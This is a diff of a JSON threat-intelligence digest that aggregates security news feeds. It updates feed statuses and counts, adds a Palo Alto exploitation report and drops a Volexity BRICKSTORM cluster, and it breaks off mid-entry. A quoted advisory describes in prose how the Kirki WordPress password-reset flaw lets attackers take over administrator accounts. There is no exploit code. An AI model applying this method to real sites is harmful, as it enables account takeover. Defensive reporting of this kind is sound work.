@@ -1,13 +1,13 @@
 {
-  "generated_at": "2026-06-05T22:21:15.558514+00:00",
+  "generated_at": "2026-06-05T22:50:16.804124+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
-  "feeds_ok": 77,
-  "total_items_in_window": 443,
-  "total_clusters_raw": 164,
-  "total_clusters_in_packet": 66,
-  "dropped_low_score": 98,
+  "feeds_ok": 78,
+  "total_items_in_window": 467,
+  "total_clusters_raw": 176,
+  "total_clusters_in_packet": 68,
+  "dropped_low_score": 108,
   "dropped_overflow": 0,
   "cohort_metadata": {
     "threat_research_primary": {
@@ -67,6 +67,13 @@
     }
   },
   "feed_status": {
+    "CrowdStrike": {
+      "url": "https://www.crowdstrike.com/blog/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
     "Unit 42": {
       "url": "https://unit42.paloaltonetworks.com/feed/",
       "cohort": "threat_research_primary",
@@ -74,12 +81,12 @@
       "item_count": 15,
       "in_window_count": 3
     },
-    "CrowdStrike": {
-      "url": "https://www.crowdstrike.com/blog/feed/",
+    "Trend Micro Research": {
+      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
+      "item_count": 25,
+      "in_window_count": 1
     },
     "SentinelOne Labs": {
       "url": "https://www.sentinelone.com/labs/feed/",
@@ -88,12 +95,12 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Trend Micro Research": {
-      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
+    "Google Threat Analysis Group": {
+      "url": "https://blog.google/threat-analysis-group/rss/",
       "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 1
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Microsoft Security Blog": {
       "url": "https://www.microsoft.com/en-us/security/blog/feed/",
@@ -109,11 +116,11 @@
       "item_count": 15,
       "in_window_count": 3
     },
-    "Google Threat Analysis Group": {
-      "url": "https://blog.google/threat-analysis-group/rss/",
+    "Microsoft Threat Intelligence": {
+      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
       "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
+      "status": "ok",
+      "item_count": 10,
       "in_window_count": 0
     },
     "Sekoia": {
@@ -123,12 +130,12 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Microsoft Threat Intelligence": {
-      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
+    "Kaspersky Securelist": {
+      "url": "https://securelist.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
+      "in_window_count": 3
     },
     "Citizen Lab": {
       "url": "https://citizenlab.ca/feed/",
@@ -137,12 +144,12 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Kaspersky Securelist": {
-      "url": "https://securelist.com/feed/",
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
+      "item_count": 15,
+      "in_window_count": 2
     },
     "NCSC UK": {
       "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
@@ -158,19 +165,12 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 2
-    },
-    "Volexity": {
-      "url": "https://www.volexity.com/feed/",
-      "cohort": "threat_research_primary",
+    "Horizon3 Attack Research": {
+      "url": "https://horizon3.ai/feed/",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 1
+      "in_window_count": 6
     },
     "ESET WeLiveSecurity": {
       "url": "https://www.welivesecurity.com/en/rss/feed/",
@@ -179,19 +179,19 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Horizon3 Attack Research": {
-      "url": "https://horizon3.ai/feed/",
-      "cohort": "offensive_vulnerability_research",
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 6
+      "item_count": 50,
+      "in_window_count": 4
     },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
+    "Volexity": {
+      "url": "https://www.volexity.com/feed/",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 2
+      "in_window_count": 1
     },
     "Assetnote": {
       "url": "https://www.assetnote.io/resources/research/rss.xml",
@@ -207,12 +207,12 @@
       "item_count": 40,
       "in_window_count": 0
     },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
+      "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 50,
-      "in_window_count": 7
+      "item_count": 10,
+      "in_window_count": 2
     },
     "GitHub Security Lab": {
       "url": "https://github.blog/category/security/feed/",
@@ -221,12 +221,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 50,
-      "in_window_count": 4
+      "in_window_count": 7
     },
     "watchTowr Labs": {
       "url": "https://labs.watchtowr.com/rss/",
@@ -237,6 +237,13 @@
     },
     "The DFIR Report": {
       "url": "https://thedfirreport.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
+    "Proofpoint Threat Insight": {
+      "url": "https://www.proofpoint.com/us/rss.xml",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
@@ -256,13 +263,6 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Proofpoint Threat Insight": {
-      "url": "https://www.proofpoint.com/us/rss.xml",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "Sophos X-Ops": {
       "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
       "cohort": "detection_response_operations",
@@ -277,19 +277,19 @@
       "item_count": 20,
       "in_window_count": 1
     },
-    "SpecterOps": {
-      "url": "https://medium.com/feed/specter-ops-posts",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "Rapid7": {
       "url": "https://www.rapid7.com/blog/rss/",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 5
+    },
+    "SpecterOps": {
+      "url": "https://medium.com/feed/specter-ops-posts",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
     },
     "Datadog Security Labs": {
       "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
@@ -305,13 +305,6 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Trail of Bits": {
-      "url": "https://blog.trailofbits.com/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Permiso Security": {
       "url": "https://permiso.io/blog/rss.xml",
       "cohort": "cloud_identity_infrastructure",
@@ -319,12 +312,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "AWS Security Blog": {
-      "url": "https://aws.amazon.com/blogs/security/feed/",
-      "cohort": "cloud_identity_infrastructure",
+    "Trail of Bits": {
+      "url": "https://blog.trailofbits.com/feed/",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 7
+      "in_window_count": 1
     },
     "Huntress": {
       "url": "https://www.huntress.com/blog/rss.xml",
@@ -333,18 +326,18 @@
       "item_count": 100,
       "in_window_count": 1
     },
+    "AWS Security Blog": {
+      "url": "https://aws.amazon.com/blogs/security/feed/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 7
+    },
     "Protect AI": {
       "url": "https://protectai.com/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
-    },
-    "Cloudflare Security": {
-      "url": "https://blog.cloudflare.com/tag/security/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
       "in_window_count": 0
     },
     "Sysdig": {
@@ -360,6 +353,13 @@
       "status": "ok",
       "item_count": 100,
       "in_window_count": 3
+    },
+    "Cloudflare Security": {
+      "url": "https://blog.cloudflare.com/tag/security/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
     },
     "Cloudflare Radar": {
       "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
@@ -382,19 +382,19 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "Chainalysis": {
-      "url": "https://www.chainalysis.com/blog/feed/",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
-    },
     "Google Cloud Threat Intelligence": {
       "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
+    },
+    "Chainalysis": {
+      "url": "https://www.chainalysis.com/blog/feed/",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 3
     },
     "Google Cloud Security": {
       "url": "https://cloudblog.withgoogle.com/rss/",
@@ -409,13 +409,6 @@
       "status": "ok",
       "item_count": 20,
       "in_window_count": 2
-    },
-    "Dark Reading": {
-      "url": "https://www.darkreading.com/rss.xml",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
     },
     "The Record": {
       "url": "https://therecord.media/feed",
@@ -438,12 +431,19 @@
       "item_count": 15,
       "in_window_count": 15
     },
-    "AI Snake Oil": {
-      "url": "https://www.aisnakeoil.com/feed",
-      "cohort": "ai_security_agentic_risk",
+    "Coveware": {
+      "url": "https://www.coveware.com/blog?format=rss",
+      "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 0
+    },
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
     },
     "Simon Willison": {
       "url": "https://simonwillison.net/atom/everything/",
@@ -459,13 +459,6 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Coveware": {
-      "url": "https://www.coveware.com/blog?format=rss",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
     "CyberScoop": {
       "url": "https://cyberscoop.com/feed/",
       "cohort": "cyber_news_breach_reporting",
@@ -473,12 +466,12 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
-      "cohort": "detection_response_operations",
+    "AI Snake Oil": {
+      "url": "https://www.aisnakeoil.com/feed",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
+      "item_count": 20,
+      "in_window_count": 0
     },
     "Help Net Security": {
       "url": "https://www.helpnetsecurity.com/feed/",
@@ -486,6 +479,13 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 10
+    },
+    "Dark Reading": {
+      "url": "https://www.darkreading.com/rss.xml",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 24
     },
     "Schneier on Security": {
       "url": "https://www.schneier.com/feed/atom/",
@@ -501,19 +501,19 @@
       "item_count": 15,
       "in_window_count": 3
     },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
     "Team Cymru": {
       "url": "https://www.team-cymru.com/post/rss.xml",
       "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 0
+    },
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
     },
     "Graham Cluley": {
       "url": "https://grahamcluley.com/feed/",
@@ -522,13 +522,6 @@
       "item_count": 20,
       "in_window_count": 3
     },
-    "Infosecurity Magazine": {
-      "url": "https://www.infosecurity-magazine.com/rss/news/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 33
-    },
     "The Hacker News": {
       "url": "https://feeds.feedburner.com/TheHackersNews",
       "cohort": "cyber_news_breach_reporting",
@@ -536,12 +529,12 @@
       "item_count": 50,
       "in_window_count": 42
     },
-    "Reddit r/netsec": {
-      "url": "https://www.reddit.com/r/netsec/.rss",
-      "cohort": "reddit_practitioner_osint",
+    "Infosecurity Magazine": {
+      "url": "https://www.infosecurity-magazine.com/rss/news/",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 25,
-      "in_window_count": 14
+      "item_count": 100,
+      "in_window_count": 33
     },
     "Intel 471": {
       "url": "https://intel471.com/blog/feed",
@@ -550,19 +543,19 @@
       "item_count": 100,
       "in_window_count": 1
     },
+    "Reddit r/netsec": {
+      "url": "https://www.reddit.com/r/netsec/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 14
+    },
     "Reddit r/blueteamsec": {
       "url": "https://www.reddit.com/r/blueteamsec/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
       "in_window_count": 24
-    },
-    "Reddit r/cybersecurity": {
-      "url": "https://www.reddit.com/r/cybersecurity/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 25
     },
     "Embrace the Red": {
       "url": "https://embracethered.com/blog/index.xml",
@@ -571,6 +564,13 @@
       "item_count": 100,
       "in_window_count": 0
     },
+    "Reddit r/cybersecurity": {
+      "url": "https://www.reddit.com/r/cybersecurity/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 25
+    },
     "tl;dr sec": {
       "url": "https://tldrsec.com/feed.xml",
       "cohort": "practitioner_analysis",
@@ -578,15 +578,8 @@
       "item_count": 20,
       "in_window_count": 1
     },
-    "Reddit r/netsecstudents": {
-      "url": "https://www.reddit.com/r/netsecstudents/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 18
-    },
-    "Reddit r/sysadmin": {
-      "url": "https://www.reddit.com/r/sysadmin/.rss",
+    "Reddit r/AskNetsec": {
+      "url": "https://www.reddit.com/r/AskNetsec/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
@@ -599,19 +592,26 @@
       "item_count": 25,
       "in_window_count": 25
     },
+    "Reddit r/sysadmin": {
+      "url": "https://www.reddit.com/r/sysadmin/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 24
+    },
+    "Reddit r/netsecstudents": {
+      "url": "https://www.reddit.com/r/netsecstudents/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 18
+    },
     "Risky Business News": {
       "url": "https://risky.biz/feeds/risky-business-news/",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 6
-    },
-    "Reddit r/AskNetsec": {
-      "url": "https://www.reddit.com/r/AskNetsec/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 24
     },
     "Just Security": {
       "url": "https://www.justsecurity.org/feed/",
@@ -632,8 +632,8 @@
     {
       "cluster_id": "df6874157e",
       "priority_score": 68,
-      "member_count": 8,
-      "corroborating_source_count": 6,
+      "member_count": 9,
+      "corroborating_source_count": 7,
       "strong_signals": [
         "CVE-2026-0257",
         "Palo Alto Networks"
@@ -836,6 +836,34 @@
             "urgency_signals": [
               "actively_exploited"
             ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Palo Alto Networks": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Patch Now: Another Palo Alto Auth Bypass Bug Under Active Exploit",
+          "link": "https://www.darkreading.com/threat-intelligence/patch-palo-alto-auth-bypass-bug-exploit",
+          "published": "2026-06-01T14:35:51+00:00",
+          "summary": "Exploiting the PAN-OS GlobalProtect VPN vulnerability requires certain conditions, but adversaries have done so in two attack waves that started in mid-May.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Palo Alto Networks"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_4_news",
             "role_map": {
@@ -1522,7 +1550,7 @@
         "link": "https://orca.security/resources/blog/kirki-wordpress-plugin-vulnerability-cve-2026-8206/",
         "published": "2026-06-02T20:36:39+00:00",
         "summary": "A critical vulnerability (CVE-2026-8206, CVSS 9.8) was disclosed affecting the Kirki Freeform Page Builder, Website Builder & Customizer plugin for WordPress, allowing attackers to take over administrator accounts via a flawed password reset mechanism. Due to the potential for full site compromise and confirmed active exploitation, immediate patching is required. Technical Root Cause The issue […]",
-        "full_body": "A critical vulnerability ( CVE-2026-8206 , CVSS 9.8) was disclosed affecting the Kirki Freeform Page Builder, Website Builder & Customizer plugin for WordPress, allowing attackers to take over administrator accounts via a flawed password reset mechanism. Due to the potential for full site compromise and confirmed active exploitation, immediate patching is required. Technical Root Cause The issue originates from the handle_forgot_password() function in the CompLibFormHandler class, where the custom REST API endpoint for password resets accepts an attacker-supplied email address instead of using the account’s registered email. By sending a crafted password reset request containing a target username and an attacker-controlled email, attackers can receive the reset link and gain full administrative access, potentially installing malicious plugins, injecting web shells, or exfiltrating sensitive data . No authentication is required to exploit this issue. Affected Versions The following components are affected: the Kirki Freeform Page Builder, Website Builder & Customizer WordPress plugin, versions 6.0.0 through 6.0.6. This plugin is installed on over 500,000 WordPress sites, with approximately 150,000 currently running vulnerable versions. Sites where the frontend account management features are enabled are particularly at risk. Remediation Guidance Users should upgrade to Kirki version 6.0.7 or later immediately. Administrators should also audit user registries for unauthorized accounts or privilege changes, review site files for unauthorized plugins, themes, or web shells, and consider deploying WAF rules to block malicious REST API requests targeting the password reset endpoint. Patchstack also offers automatic virtual patching rules for organizations that need time to schedule an update. Current Threat Status At the time of writing, active exploitation has been confirmed, with Wordfence reporting 59 blocked attacks targeting this vulnerability within a 24-hour period. The severity, ease of exploitation, and lack of authentication requirements make this vulnerability extremely high risk, especially for internet-facing WordPress deployments. Potential Impact Successful exploitation could allow attackers to gain full administrative control over WordPress sites, install backdoors and web shells, and exfiltrate user data and site content, leading to service disruption, data exposure, or full infrastructure compromise. How can Orca help? Orca enables customers to quickly identify assets running vulnerable versions of the Kirki plugin, understand their exposure in context, including internet accessibility, runtime reachability, and asset criticality, and prioritize remediation based on real risk rather than CVSS alone. Orca’s agentless SideScanning technology detects WordPress installations and identifies outdated or vulnerable plugins across customer cloud environments without requiring agents or credentials on the target systems. Orca’s platform highlights affected assets directly in the newItem view, helping security teams focus on the most critical remediation paths first. Related articles Cloud Security Learning What Is Cloud Security Architecture? Principles, Layers, and Frameworks Jun 05, 2026 Cloud Security Learning What Is ASPM? A Guide to Application Security Posture Management Jun 05, 2026 Cloud Security Learning What Is SaaS Security? A Practical Guide 2026 Jun 05, 2026 Stay in the loop Keep up to date with everything you need to know about cloud security and our latest research By submitting my email address I agree to the use of my personal data in accordance with Orca Security Privacy Policy . Personalized Demo See Orca Security in Action Gain visibility, achieve compliance, and prioritize risks with the Orca Cloud Security Platform. Get a Demo Chat with Us See Orca Security in Action Gain visibility, achieve compliance, and prioritize risks with the Orca Cloud Security Platform. Chat with an Orca Expert No Slack accoun",
+        "full_body": "A critical vulnerability ( CVE-2026-8206 , CVSS 9.8) was disclosed affecting the Kirki Freeform Page Builder, Website Builder & Customizer plugin for WordPress, allowing attackers to take over administrator accounts via a flawed password reset mechanism. Due to the potential for full site compromise and confirmed active exploitation, immediate patching is required. Technical Root Cause The issue originates from the handle_forgot_password() function in the CompLibFormHandler class, where the custom REST API endpoint for password resets accepts an attacker-supplied email address instead of using the account’s registered email. By sending a crafted password reset request containing a target username and an attacker-controlled email, attackers can receive the reset link and gain full administrative access, potentially installing malicious plugins, injecting web shells, or exfiltrating sensitive data . No authentication is required to exploit this issue. Affected Versions The following components are affected: the Kirki Freeform Page Builder, Website Builder & Customizer WordPress plugin, versions 6.0.0 through 6.0.6. This plugin is installed on over 500,000 WordPress sites, with approximately 150,000 currently running vulnerable versions. Sites where the frontend account management features are enabled are particularly at risk. Remediation Guidance Users should upgrade to Kirki version 6.0.7 or later immediately. Administrators should also audit user registries for unauthorized accounts or privilege changes, review site files for unauthorized plugins, themes, or web shells, and consider deploying WAF rules to block malicious REST API requests targeting the password reset endpoint. Patchstack also offers automatic virtual patching rules for organizations that need time to schedule an update. Current Threat Status At the time of writing, active exploitation has been confirmed, with Wordfence reporting 59 blocked attacks targeting this vulnerability within a 24-hour period. The severity, ease of exploitation, and lack of authentication requirements make this vulnerability extremely high risk, especially for internet-facing WordPress deployments. Potential Impact Successful exploitation could allow attackers to gain full administrative control over WordPress sites, install backdoors and web shells, and exfiltrate user data and site content, leading to service disruption, data exposure, or full infrastructure compromise. How can Orca help? Orca enables customers to quickly identify assets running vulnerable versions of the Kirki plugin, understand their exposure in context, including internet accessibility, runtime reachability, and asset criticality, and prioritize remediation based on real risk rather than CVSS alone. Orca’s agentless SideScanning technology detects WordPress installations and identifies outdated or vulnerable plugins across customer cloud environments without requiring agents or credentials on the target systems. Orca’s platform highlights affected assets directly in the newItem view, helping security teams focus on the most critical remediation paths first. Related articles Cloud Security Learning What Is ASPM? A Guide to Application Security Posture Management Jun 05, 2026 Cloud Security Learning What Is SaaS Security? A Practical Guide 2026 Jun 05, 2026 Cloud Security Learning What Is a Man-in-the-Middle Attack? A Cloud Security Guide Jun 04, 2026 Stay in the loop Keep up to date with everything you need to know about cloud security and our latest research By submitting my email address I agree to the use of my personal data in accordance with Orca Security Privacy Policy . Personalized Demo See Orca Security in Action Gain visibility, achieve compliance, and prioritize risks with the Orca Cloud Security Platform. Get a Demo Chat with Us See Orca Security in Action Gain visibility, achieve compliance, and prioritize risks with the Orca Cloud Security Platform. Chat with an Orca Expert No Slack account required.",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
@@ -2920,34 +2948,6 @@
           }
         },
         {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Anthropic Expands Mythos Access to 150 More Organizations",
-          "link": "https://www.infosecurity-magazine.com/news/anthropic-glasswing-expansion/",
-          "published": "2026-06-03T09:30:00+00:00",
-          "summary": "Anthropic widens Project Glasswing access to 150 more firms as patching becomes the bottleneck",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Anthropic/Claude"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Anthropic/Claude": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
           "source": "The Hacker News",
           "cohort": "cyber_news_breach_reporting",
           "title": "Claude Code GitHub Action Flaw Let One Malicious Issue Hijack Repositories",
@@ -2971,6 +2971,34 @@
             "role_map": {
               "Anthropic/Claude": "target",
               "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Anthropic Expands Mythos Access to 150 More Organizations",
+          "link": "https://www.infosecurity-magazine.com/news/anthropic-glasswing-expansion/",
+          "published": "2026-06-03T09:30:00+00:00",
+          "summary": "Anthropic widens Project Glasswing access to 150 more firms as patching becomes the bottleneck",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Anthropic/Claude"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Anthropic/Claude": "target"
             },
             "weak_tags": {
               "products": []
@@ -5458,204 +5486,6 @@
       ]
     },
     {
-      "cluster_id": "15d2915b57",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "web_shell_backdoor"
-        ],
-        "actor_attribution": [
-          "UNC5221"
-        ],
-        "affected_industries": [],
-        "affected_products": [
-          "Google Cloud",
-          "Microsoft 365"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Volexity",
-        "cohort": "threat_research_primary",
-        "title": "VerdantBamboo: Just Another BRICKSTORM in the Firewall",
-        "link": "https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/",
-        "published": "2026-06-04T20:23:55+00:00",
-        "summary": "In September 2025, Volexity conducted an incident response engagement that began after suspicious network traffic was observed from a Linux-based virtual machine appliance on a customer’s network. The virtual machine […] The post VerdantBamboo: Just Another BRICKSTORM in the Firewall appeared first on Volexity .",
-        "full_body": "Threat Intelligence VerdantBamboo: Just Another BRICKSTORM in the Firewall June 4, 2026 Damien Cash, Paul Rascagneres, Steven Adair, and Tom Lancaster In September 2025, Volexity conducted an incident response engagement that began after suspicious network traffic was observed from a Linux-based virtual machine appliance on a customer’s network. The virtual machine was an Egnyte Storage Sync system, which is designed to facilitate syncing local on-premise files with the cloud. Volexity discovered that instead of connecting to a domain affiliated with Egnyte, the appliance was connecting to a threat-actor-controlled domain behind Cloudflare IP addresses. The appliance was also making TLS connections to one of Google’s public DNS servers ( 8.8.8.8 ). It appeared to be using Google to perform queries via DNS over HTTPS, as there was no DNS activity for the domain observed in the connections. Later in the investigation, this was confirmed to be the case after Volexity obtained snapshots of the Storage Sync system for analysis. Ultimately, Volexity’s analysis revealed that a Chinese threat actor, which Volexity tracks as VerdantBamboo (WARP PANDA, UNC5221), had compromised the Storage Sync system. The suspicious connections observed were the result of a malware implant known as BRICKSTORM (described in public reporting, including posts by CISA , Google Cloud and NVISO ). Volexity’s analysis also revealed that the appliance had periodically been accessed by VerdantBamboo via IP addresses assigned through the victim organization’s web SSL VPN. The initial findings determined that the threat actor used the malware’s proxying capabilities deployed on the Storage Sync system, along with compromised credentials, to access the victim’s Microsoft 365 (M365) environment. Volexity assesses with high confidence that this was done to blend in with legitimate network traffic and evade Conditional Access policies that would have otherwise prevented access. Further investigation uncovered a much longer timeline: the initial compromise had actually occurred at least 18 months earlier. After Volexity completed the initial remediation effort, VerdantBamboo returned to once again breach the victim organization by connecting with stolen administrative credentials to the victim’s firewall. VerdantBamboo used that access to enable and configure web SSL VPN access to that device. That access was then used to further connect to systems internally and deploy additional custom malware to a Synology NAS appliance. During the course of the investigation, Volexity determined that VerdantBamboo had compromised the victim organization’s Managed Services Provider (MSP). Working closely with the MSP, Volexity found suspect traffic emanating from the MSP’s network as well. After a brief investigation of the MSP’s network, Volexity found that the MSP’s pfSense firewall had been compromised by VerdantBamboo with a BSD variant of BRICKSTORM. Volexity concluded that this firewall, like the victim organization’s Storage Sync system, had also been compromised at least 18 months earlier. Volexity assesses with medium confidence that the victim organization had been compromised by way of VerdantBamboo’s breach of the MSP. Forensic investigation of the Storage Sync system and the pfSense firewall resulted in the discovery of multiple samples of the BRICKSTORM backdoor. Volexity would later find a BRICKSTORM sample on the victim organization’s network on a virtual machine that had been retired. This sample was installed on a legacy Linux-based GroupWise server used for archived email messages, which had since been fully shutdown but was still accessible for the investigation. While BRICKSTORM was the primary implant used by VerdantBamboo, Volexity identified two previously undocumented (at the time of discovery) malware families: PLENET , a malware family written in .NET Core and compiled to native code using the Native AOT features added in .NET 7. The analyzed sample was w",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "web_shell_backdoor"
-          ],
-          "actor_attribution": [
-            "UNC5221"
-          ],
-          "affected_industries": [],
-          "affected_products": [
-            "Microsoft 365",
-            "Google Cloud"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {
-            "Microsoft 365": "target",
-            "Google Cloud": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Volexity",
